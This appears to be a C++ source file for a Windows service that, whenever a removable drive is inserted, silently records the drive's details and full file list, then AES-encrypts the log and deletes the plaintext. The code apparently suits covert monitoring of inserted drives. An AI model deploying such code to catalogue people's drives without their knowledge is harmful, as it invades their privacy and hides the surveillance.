#include "stdafx.h"
#include "Device.h"
#include <memory>
#include <list>
#include <fstream>
#include <iomanip>
#include <sstream>
#include <string>
#include "FileLister.h"
#include "AESKey.h"
#include "AESEncrypt.h"
#include <filesystem>
#include "Convert.h"
using namespace std;
using namespace filesystem;

bool IsServiceOn = true;

void DeviceArrivalMain(TCHAR DriveLetter) {
	Device dv(DriveLetter);
	Device::DiskInformation info = dv.GetDiskInformation();
	FileLister lister(dv);
	shared_ptr<list<FileLister::FileData>> pls = lister.ListFile();
	_wsetlocale(LC_ALL, L"chs");
	SYSTEMTIME time;
	GetLocalTime(&time);
	wstringstream ss;
	ss << time.wYear << L"-" << time.wMonth << L"-" << time.wDay << L" "
		<< setw(2) << setfill(L'0') << time.wHour << L"."
		<< setw(2) << setfill(L'0') << time.wMinute << L"."
		<< setw(2) << setfill(L'0') << time.wSecond;
	wstring filename, _filename;
	getline(ss, filename);
	_filename = filename;
	wstring keyname;
	keyname = filename;
	filename += L".ifld";
	_filename += L".ifl";
	keyname += L".iky";
	FILE* file = _wfopen(filename.c_str(), L"w");
	fwprintf(file, L"Basic Information\n--------------------------\nDrive Letter: %c\nLabel: %s\nSN: %lu\nFileSystem: %s\nSpace: %llu\n\nFile List\n--------------------------\n",
		info.DriveLetter, info.Label.c_str(), info.VolumeSerialNumber, info.FileSystem.c_str(), info.TotalSpace);
	for (list<FileLister::FileData>::const_iterator it = pls->cbegin(); it != pls->cend();++it) {
		fwprintf(file, L"%s/%s\n", it->Dictionary, it->name);
	}
	fclose(file);
	AESKey key;
	Convert convert;
	key.WriteAESKey(convert.toANSIString(keyname).c_str(), "encryption.ipk");
	AESEncrypt encrypt(key);
	encrypt.Encrypt(filename.c_str(), _filename.c_str());
	remove(path(filename));
}

void DeviceRemovalMain(TCHAR DriveLetter) {

}